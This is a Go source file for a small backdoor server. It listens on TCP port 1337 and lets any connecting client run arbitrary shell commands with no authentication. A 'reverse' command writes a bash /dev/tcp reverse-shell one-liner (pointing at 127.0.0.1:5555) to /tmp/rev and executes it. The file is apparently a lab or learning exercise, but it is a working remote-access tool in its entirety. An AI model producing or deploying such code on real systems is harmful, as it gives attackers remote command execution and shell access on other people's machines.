package main

import (
	"bufio"
	"io/ioutil"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

const (
	connHost = "localhost"
	connPort = "1337"
	connType = "tcp"
)

func main() {
	address := connHost + ":" + connPort

	fmt.Println("Starting", connType, "server on", address)

	l, err := net.Listen(connType, address)

	if err != nil {
		fmt.Println("Error:", err.Error())
		os.Exit(1)
	}
	defer l.Close()

	for {
		c, err := l.Accept()
		if err != nil {
			fmt.Println("Error:", err.Error())
			os.Exit(1)
		}
		fmt.Println("Client", c.RemoteAddr().String(), "connected.")

		go handleConnection(c)
	}
}

func handleConnection(conn net.Conn) {
	buffer, err := bufio.NewReader(conn).ReadBytes('\n')

	if err != nil {
		fmt.Println("Connection closed.")
		conn.Close()
		return
	}

	log.Println("Client message:", string(buffer[:len(buffer)-1]))

	switch string(buffer[:len(buffer)-1]) {
	case "shell_exec":
		conn.Write([]byte(shellExec(conn)))
	case "whichos":
		conn.Write([]byte(checkOS()))
	case "reverse":
		conn.Write([]byte(openReverse()))
	default:
		conn.Write([]byte("Command not found.\n"))
	}

	handleConnection(conn)
}

func checkOS() string {
	return "Running on " + runtime.GOOS + "\n"
}

func shellExec(conn net.Conn) string {
	buffer, err := bufio.NewReader(conn).ReadBytes('\n')

	if err != nil {
		conn.Close()
		return "Connection closed.\n"
	}

	instr := strings.Split(string(buffer), " ")

	var cmd *exec.Cmd

	if len(instr) > 1 {
		args := instr[1:]
		cmd = exec.Command(instr[0], args...)
	} else {
		cmd = exec.Command(string(buffer[:len(buffer)-1]))
	}

	stdout, err := cmd.Output()

	if err != nil {
		return err.Error() + "\n"
	}

	return string(stdout)
}

func openReverse() string {
	if !fileExists("/tmp/rev"){
		d1 := []byte("bash -i >& /dev/tcp/127.0.0.1/5555 0>&1\n")
		err := ioutil.WriteFile("/tmp/rev", d1, 0644)
		if err != nil{
			return "Failed to write file.\n"
		}
	}

	cmd := exec.Command("bash", "/tmp/rev")

	stdout, err := cmd.Output()

	if err != nil {
		return err.Error() + "\n"
	}

	return string(stdout) + "\n"

}

func fileExists(filename string) bool {
    info, err := os.Stat(filename)
    if os.IsNotExist(err) {
        return false
    }
    return !info.IsDir()
}